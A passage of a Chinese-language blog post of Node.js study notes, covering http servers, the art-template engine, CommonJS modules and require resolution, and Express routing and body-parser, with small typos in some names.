class="string">&quot;服务器启动成功，可以通过http://127.0.0.1:3000/ 进行访问&quot;</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><blockquote><p>此时在终端运行文件后 会打印listen的内容 表启动了服务器 此时 如果用浏览器打开 访问 就会触发request请求</p><p>可以用 crtl + c 结束服务器</p><img src='https://s1.328888.xyz/2022/04/09/XK83v.jpg' style="zoom:80%; float:left;" ><p>加上request 和 response 后</p><img src='https://s1.328888.xyz/2022/04/09/XKAE0.jpg' style="zoom:80%; float:left;" ></blockquote></li><li><p>利用 服务器的 response 响应页面</p><blockquote><p>与 fs 核心模块 配合使用 到对应的url 就读相应文件 然后响应到客户端上</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&quot;http&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> server = http.<span class="title function_">createServer</span>();</span><br><span class="line">server.<span class="title function_">on</span>(<span class="string">&#x27;request&#x27;</span>, <span class="keyword">function</span> (<span class="params">request, response</span>) &#123;</span><br><span class="line">  response.<span class="title function_">setHeader</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/plain;charset=utf-8&quot;</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;访问路径为: &quot;</span> + request.<span class="property">url</span>);</span><br><span class="line">  <span class="keyword">if</span> (request.<span class="property">url</span> == <span class="string">&#x27;/index&#x27;</span>) &#123;</span><br><span class="line">    fs.<span class="title function_">readFile</span>(<span class="string">&#x27;./view/learn.html&#x27;</span>, <span class="keyword">function</span> (<span class="params">err, data</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;文件读取失败 请稍后重试&quot;</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        response.<span class="title function_">setHeader</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/html;charset=utf-8&quot;</span>);</span><br><span class="line">        response.<span class="title function_">end</span>(data)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    response.<span class="title function_">end</span>(<span class="string">&quot;其他&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;服务器启动成功，可以通过http://127.0.0.1:3000/ 进行访问&quot;</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ol></li></ul><h4 id="2.3.3-第三方模块">2.3.3 第三方模块<a title="#2.3.3-第三方模块" href="#2.3.3-第三方模块"></a></h4><h4 id="2.3.4-用户自定义模块">2.3.4 用户自定义模块<a title="#2.3.4-用户自定义模块" href="#2.3.4-用户自定义模块"></a></h4><blockquote><p>node 中只有 模块作用域</p></blockquote><p>require</p><p>作用 ：用来加载模块执行代码 (1.具名的核心模块 fs… 2.用户自己编写的文件模块 ./… ./不能省略 后缀名可以省 )</p><p>​                 拿到模块中的导出对象</p><h3 id="2.4-ip地址和端口号">2.4 ip地址和端口号<a title="#2.4-ip地址和端口号" href="#2.4-ip地址和端口号"></a></h3><ul><li>网卡：只有一个 同一个局域网中 网卡的地址唯一 通过唯一的ip地址来进行定位</li><li>ip 地址 用来定位计算机</li><li>端口号 用来定位具体的应用程序<ul><li>所有需要联网的应该程序都会占用一个端口号</li><li>端口号的范围 0 - 65536 之间</li><li>不要用到默认端口号</li></ul></li></ul><blockquote><p>核心模块 http 中  const http = require(‘http’)</p><p>创建server let server = http.createServer()</p><p>监听request 请求事件 server.on(‘request’,function(request , response){…})</p><ul><li>请求url : request.url</li><li>请求我的客户端端口号 : request.socket.remotePort</li><li>请求我的客户端地址 ip+port : request.socket.remoteAddress</li></ul></blockquote><h3 id="2.5-服务端渲染-和-客户端渲染">2.5 服务端渲染 和 客户端渲染<a title="#2.5-服务端渲染-和-客户端渲染" href="#2.5-服务端渲染-和-客户端渲染"></a></h3><ol><li><p>服务端渲染</p><ul><li><p><strong>页面刷新</strong> 服务端渲染 网页源码有</p></li><li><p>只请求一次</p></li><li><p>响应的就是页面最终结果</p></li><li><img src='https://s1.328888.xyz/2022/04/09/XKHRF.jpg' style="zoom:60%;" ></li></ul></li><li><p>客户端渲染</p><ul><li><strong>点击页面不刷新</strong> ajax 异步请求 数据信息在开发者工具才能看到</li><li>两次请求</li><li>第一次 拿到页面</li><li>第二次 拿到动态数据</li><li>再将数据渲染到页面上</li><li><img src='https://s1.328888.xyz/2022/04/09/XKq6W.jpg' style="zoom:60%;" ></li></ul></li></ol><h3 id="2.5-repl">2.5 REPL<a title="#2.5-repl" href="#2.5-repl"></a></h3><p>在终端直接输入node 回车 就可以测试 node 代码</p><ul><li>read</li><li>eval</li><li>print</li><li>loop</li></ul><h2 id="3.-模板引擎">3. 模板引擎<a title="#3.-模板引擎" href="#3.-模板引擎"></a></h2><blockquote><p>to 字符串替换</p></blockquote><p><a href="https://github.com/aui/art-template" target="_blank">art-template 官网</a></p><h3 id="3.1-安装">3.1 安装<a title="#3.1-安装" href="#3.1-安装"></a></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install art-template --save</span><br></pre></td></tr></table></figure><h3 id="3.2-在-html-浏览器中使用">3.2 在 html 浏览器中使用<a title="#3.2-在-html-浏览器中使用" href="#3.2-在-html-浏览器中使用"></a></h3><p>模板引擎不关心 字符串的内容 只关心自己认识的模板标记语法 例如 mustache 语法 <code>&#123;&#123;&#125;&#125;`1. 安装2. 导入 lib/template-web.js3. 写 text/template id='bbb' 的模板4. 写 `template('bbb'&#123;…&#125;)` 即模板的`&#123;&#123;&#125;&#125;</code> 里的数据</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;node_modules/art-template/lib/template-web.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/template&quot;</span> <span class="attr">id</span>=<span class="string">&#x27;tpl&#x27;</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    我叫</span><span class="template-variable">&#123;&#123;<span class="name">name</span>&#125;&#125;</span><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  </span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> ret = <span class="title function_">template</span>(<span class="string">&#x27;tpl&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">name</span>: <span class="string">&quot;lsy&quot;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(ret); <span class="comment">//模板引擎里面的内容</span></span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3.3-在-node-中使用">3.3 在 node 中使用<a title="#3.3-在-node-中使用" href="#3.3-在-node-中使用"></a></h3><blockquote><p>模板最早诞生于服务器领域 后来才发展到了前端</p></blockquote><ol><li>安装</li><li>加载 art-template</li><li>查文档 使用api</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> template = <span class="built_in">require</span>(<span class="string">&quot;art-template&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> str = <span class="string">`&lt;p&gt; hello 我是 &#123;&#123;name&#125;&#125; &lt;/p&gt;`</span></span><br><span class="line"><span class="keyword">let</span> ret = template.<span class="title function_">render</span>(str, &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;lsy&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(ret);</span><br></pre></td></tr></table></figure><p>将模板作为html 导入的写法 并且替换html 响应到页面上</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//./02-data.html</span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>hello 我是&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> template = <span class="built_in">require</span>(<span class="string">&quot;art-template&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&quot;http&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> server = http.<span class="title function_">createServer</span>();</span><br><span class="line">server.<span class="title function_">on</span>(<span class="string">&#x27;request&#x27;</span>, <span class="keyword">function</span> (<span class="params">request, response</span>) &#123;</span><br><span class="line">  fs.<span class="title function_">readFile</span>(<span class="string">&#x27;./02-data.html&#x27;</span>, <span class="keyword">function</span> (<span class="params">err, data</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;文件读取失败&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> ret = template.<span class="title function_">render</span>(data.<span class="title function_">toString</span>(), &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&#x27;lsy&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="comment">// console.log(ret);</span></span><br><span class="line">    response.<span class="title function_">end</span>(ret)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">server.<span class="title function_">listen</span>(<span class="string">&#x27;3000&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;running...&#x27;</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="3.4-发表留言的例子">3.4 发表留言的例子<a title="#3.4-发表留言的例子" href="#3.4-发表留言的例子"></a></h3><h4 id="3.4.1-目录结构：">3.4.1 目录结构：<a title="#3.4.1-目录结构：" href="#3.4.1-目录结构："></a></h4><p>’ &gt; node_modules :</p><p>’ &gt; public : 把所有静态资源都放在这</p><p>​             ’ &gt; css</p><p>​             ’ &gt; img</p><p>​             ’ &gt; js</p><p>​             ’ &gt; lib : jquery.js 这种第三方文件</p><p>’ &gt; views : 所有 html 文件</p><p>’ &gt; app.js : 后端业务</p><h4 id="3.4.2-表单中需要提交的表单控件元素-必须具有-name-属性">3.4.2 表单中需要提交的表单控件元素 必须具有 <strong>name</strong> 属性<a title="#3.4.2-表单中需要提交的表单控件元素-必须具有-name-属性" href="#3.4.2-表单中需要提交的表单控件元素-必须具有-name-属性"></a></h4><p>表单提交分为：1.默认的提交行为 2.表单异步提交</p><p>action 表单提交的地址 == 请求的 url</p><p>method 请求方法</p><h4 id="3.4.3-url-核心模块">3.4.3 url 核心模块<a title="#3.4.3-url-核心模块" href="#3.4.3-url-核心模块"></a></h4><p>url.parse(‘…url…’ ，true) : 将…url… 解析为一个方便接受的对象 ；</p><p>​                                        第二个参数==true时，会将查询字符串 query 拆成对象 否则为字符串</p><h4 id="3.4.4-重定向">3.4.4 重定向<a title="#3.4.4-重定向" href="#3.4.4-重定向"></a></h4><ol><li><p>状态码设置为 302 临时重定向</p></li><li><p>在响应头通过 Location 通知客户端重定向的地址</p></li><li><p>res.statusCode = 302;</p><p>res.setHeader(‘Location’, ‘/’);</p><p>res.end();</p></li></ol><blockquote><p>如果客户端 发现服务器的响应的状态码是302 就会去自动找响应头中找 Location 对应的url</p><p>所以就可以看到客户端自动跳转</p></blockquote><h4 id="3.4.5-each">3.4.5 each<a title="#3.4.5-each" href="#3.4.5-each"></a></h4><ol><li><p>art-template 的专属each 模板语法</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;each 数组&#125;&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;&#123; $value &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">&#123;&#123;/each&#125;&#125;</span><br></pre></td></tr></table></figure></li><li><p>es5 的 forEach</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ie 8 不支持</span></span><br><span class="line">[<span class="string">&#x27;abc&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;efg&#x27;</span>].<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">item,index</span>)&#123;</span><br><span class="line">    </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>遍历 jq 元素</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//jq 2.0 以下 可以兼容ie 低版本</span></span><br><span class="line">$.<span class="title function_">each</span>([<span class="string">&#x27;abc&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;efg&#x27;</span>],<span class="keyword">function</span>(<span class="params">index,item</span>)&#123;</span><br><span class="line">    </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>伪数组的遍历 eg：$(‘div’)</p><p>伪数组是对象  对象的原型链Object.prototype 中没有forEach   不能用 如果要用的话 看下面</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这个 each 是 jq 提供的 是在 jq 的原型链中的</span></span><br><span class="line">$(<span class="string">&#x27;div&#x27;</span>).<span class="title function_">each</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;)</span><br><span class="line"><span class="comment">//或者可以用forEach</span></span><br><span class="line">[].<span class="property">slice</span>.<span class="title function_">call</span>($(<span class="string">&#x27;div&#x27;</span>)).<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;)</span><br></pre></td></tr></table></figure></li></ol><h2 id="4.-node-中的模块系统">4. Node 中的模块系统<a title="#4.-node-中的模块系统" href="#4.-node-中的模块系统"></a></h2><p>使用 node 编写应用程序 主要就是在使用：</p><ol><li>EcmaScript 语言</li><li>核心模块</li><li>第三方模块</li><li>自定义模块</li></ol><h3 id="4.1-模块化">4.1 模块化<a title="#4.1-模块化" href="#4.1-模块化"></a></h3><ul><li><p>文件作用域</p></li><li><p>通信规则</p><ul><li>加载 require</li><li>导出</li></ul></li></ul><h3 id="4.2-commonjs-模块规范">4.2 CommonJS 模块规范<a title="#4.2-commonjs-模块规范" href="#4.2-commonjs-模块规范"></a></h3><ul><li><p>模块作用域</p></li><li><p>加载模块 require</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;文件url&#x27;</span>)</span><br></pre></td></tr></table></figure></li><li><p>导出模块成员 exports</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//导出多个成员</span></span><br><span class="line"><span class="keyword">export</span>.<span class="property">a</span> = <span class="string">&#x27;...&#x27;</span>;</span><br><span class="line"><span class="keyword">export</span>.<span class="property">b</span> = <span class="string">&#x27;...&#x27;</span>;</span><br><span class="line">...</span><br><span class="line"><span class="comment">//导出单个成员 后面会覆盖前面</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="string">&#x27;...&#x27;</span></span><br></pre></td></tr></table></figure></li></ul><p>原理：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//里面有隐藏的</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable language_">module</span> = &#123;</span><br><span class="line">    <span class="attr">exports</span>:&#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> <span class="built_in">exports</span> = <span class="variable language_">module</span>.<span class="property">exports</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">module</span>.<span class="property">exports</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">//导出单个成员 不能export = &#x27;...&#x27; 这样就会指向另一个对象 导出的数据就不对了</span></span><br><span class="line"><span class="comment">// 即 给 exports 和 module.exports 赋值都会断开引用</span></span><br></pre></td></tr></table></figure><h3 id="4.3-require-加载机制">4.3 require 加载机制<a title="#4.3-require-加载机制" href="#4.3-require-加载机制"></a></h3><p>优先从缓存加载 -&gt; 核心模块 -&gt; 路径形式的文件模块 -&gt; 第三方模块…</p><blockquote><p>更加底层的在 《深入浅出node.js》模块化</p></blockquote><p>require(‘模块标识符’)  : 核心模块/第三方模块/自定义模块</p><p>if 第三方模块</p><ol><li><p>通过 npm 下载</p></li><li><p>使用时 通过 require(“包名”) 进行加载</p></li><li><p>不可能有一个第三方包与核心模块的名字相同</p></li><li><p>既不是核心模块 也不是路径的时候 会 (eg：art-template)</p><ul><li><p>找到当前文件所在目录中的 node_modules 目录</p></li><li><p>再依次找到 node_modules/art-template/package.json 文件中的 main(: ‘index.js’) 属性</p><blockquote><p>if 没有 package.json 或者没有main ,就会自动找 index.js (默认备选项)</p></blockquote></li><li><p>main 属性中就记录了 art-template 的入口模块</p></li><li><p>然后加载使用这个第三方包 实际上最终加载的还是文件</p></li><li><p>if 本级无法查找到 就会往上一级 找node_modules… 直到根目录</p></li><li><p>if 还无 就报错</p></li><li><p>正常项目就一个node….在根目录</p></li></ul></li></ol><h2 id="5.-express">5. Express<a title="#5.-express" href="#5.-express"></a></h2><blockquote><p>原生 http 在某方面表现不足以应对开发需求 所以需要使用框架 加快开发效率</p><p>在node中 有很多web开发框架 以学习Express(封装http)为主</p><p>作者 : TJ  node作者:ryan dahl</p></blockquote><p><a href="https://expressjs.com/" target="_blank">官方网站</a></p><h3 id="5.1-起步">5.1 起步<a title="#5.1-起步" href="#5.1-起步"></a></h3><h4 id="5.1.1-安装">5.1.1 <strong>安装</strong><a title="#5.1.1-安装" href="#5.1.1-安装"></a></h4><p><code>npm install express --save</code></p><h4 id="5.1.2-使用：">5.1.2 <strong>使用</strong>：<a title="#5.1.2-使用：" href="#5.1.2-使用："></a></h4><p>1.导包 2.创建服务器应用程序</p><blockquote><ul><li>处理路径问题 和中文乱码 app.get(‘/’, function (req, res) { res.send(‘hello’)  })</li><li>公开指定目录 app.use(‘/public/’, express.static(‘./public/’))</li><li>直接获取查询字符串参数 req.query</li><li>响应代码 res.send()</li><li>res.redirect(‘/’) 和 res.send() 会直接结束请求</li></ul></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2. 引包</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 创建服务器应用程序 == http.createServer</span></span><br><span class="line"><span class="keyword">let</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 公开指定目录 public 就可以直接通过 /public/xxx 访问目录中的所有资源</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/public/&#x27;</span>, express.<span class="title function_">static</span>(<span class="string">&#x27;./public/&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 服务器收到get请求时 执行回调函数</span></span><br><span class="line"><span class="comment">// 直接处理路径问题 和中文乱码</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="string">&#x27;hello&#x27;</span>)   <span class="comment">// 也可以原来的 res.end()</span></span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/other&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">query</span>); <span class="comment">// 直接获取 查询字符串参数 </span></span><br><span class="line">  res.<span class="title function_">send</span>(<span class="string">&#x27;其他&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ==server.listen</span></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;running...&#x27;</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="5.1.3-基本路由">5.1.3 基本路由<a title="#5.1.3-基本路由" href="#5.1.3-基本路由"></a></h4><p>路由器：请求方法 请求路径 请求处理函数</p><p>app.get(‘/’,function(){})</p><p>app.post(‘/’,function(){})</p><h4 id="5.1.4-静态服务/路由">5.1.4 静态服务/路由<a title="#5.1.4-静态服务/路由" href="#5.1.4-静态服务/路由"></a></h4><p><a href="">官网 -&gt; getting started -&gt; static file</a></p><ol><li><p>当以 /public/ 开头时 去 ./public/ 目录找对应的资源</p><p>app.use(‘/public/’ , express.static(‘./public/’))  =&gt; /public/xxx</p></li><li><p>当省略第一个参数时 则通过省略 /public 的目录 访问 简化路径操作</p><p>app.use(express.static(‘./public/’)) =&gt; /xxx</p></li><li><p>当第一个参数 为 /a/ 时 ，相当于 在目录中 ./public/ 被 ./a/ 替换(别名)</p><p>app.use(‘/a/’ , express.static(‘./public/’))  =&gt; /a/xxx</p></li></ol><h3 id="5.2-express-配置使用-art-template-模板引擎">5.2 express 配置使用 art-template 模板引擎<a title="#5.2-express-配置使用-art-template-模板引擎" href="#5.2-express-配置使用-art-template-模板引擎"></a></h3><blockquote><ol><li>生成 package.js ==&gt; <code>npm init –yes</code></li><li>安装 express ==&gt; <code>npm i -S express</code></li></ol></blockquote><ol><li><p>安装在express 使用的art-template</p><p>==&gt; <code>npm i -S art-template</code>  <code>npm i -S express-art-template</code></p></li><li><p>配置：</p><p>…</p><p>app.engine(‘html’, require(‘express-art-template’))  ==&gt; ‘art’ 可以 ‘html’</p><p>…</p><blockquote><p>第一个参数：当渲染以 .art 文件时 使用art-template模板</p><p>express-art-template 专门用来在 express 中把 art-template 整合到 express 中</p><p>express-art-template 依赖 art-template</p></blockquote></li><li><p>使用：</p><p>app.get(‘/’,function(req,res){ res.render(‘index.art’),{ title:‘hello’ } })</p><blockquote><p>Express 为 Response 对象提供了 render 方法 默认不能用 配置模板引擎才能用</p><p>res.render(‘html模板名’ , {模板数据})  ==&gt; <strong>if 上engine 为 art 那模板名就要.art</strong></p><p>第一个参数不写路径(<strong>省略 views 而已</strong>) 默认会去 views 目录找 模板文件 (把所有视图文件都放到 views )</p></blockquote><blockquote><p>if 希望修改 默认 的 views 视图渲染目录 ==&gt; app.set(‘views’,目录路径)</p></blockquote></li></ol><h3 id="5.4-express-获取表单-get-请求体数据">5.4 express 获取表单 get 请求体数据<a title="#5.4-express-获取表单-get-请求体数据" href="#5.4-express-获取表单-get-请求体数据"></a></h3><p>express 内置了api 直接通过 req.juery 获取</p><h3 id="5.5-express-获取表单-post-请求体数据">5.5 express 获取表单 post 请求体数据<a title="#5.5-express-获取表单-post-请求体数据" href="#5.5-express-获取表单-post-请求体数据"></a></h3><p>提交表单 get —&gt; post  /puton —&gt; publish  : 用同一个请求路径 可以多次处理请求 get/post</p><p>在express 中没有内置获取表单post请求体的api</p><p>==&gt; 使用 第三方包 <code>body-parse</code> (express官网 minddleware )中间件/插件</p><ol><li><p>安装 : <code>npm i -S body-parse</code></p></li><li><p>配置 :</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)          <span class="comment">//---引包</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在req请求多一个body属性  通过req.body 获取表单post请求体数据</span></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())                         <span class="comment">//---配置 body-parser</span></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;))</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/publish&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  comments.<span class="title function_">unshift</span>(req.<span class="property">body</span>);</span><br><span class="line">  res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ol><h3 id="5.6-crub-案例的知识点">5.6 crub 案例的知识点<a title="#5.6-crub-案例的知识点" href="#5.6-crub-案例的知识点"></a></h3><blockquote><p>注意点 ：表单提交的时候 要有name 才能提交到 查询字符串</p></blockquote><ul><li><p>把对象存在文件里 然后读取使用 读取的是字符串-&gt;对象</p><p>读取文件错误 用状态码500</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 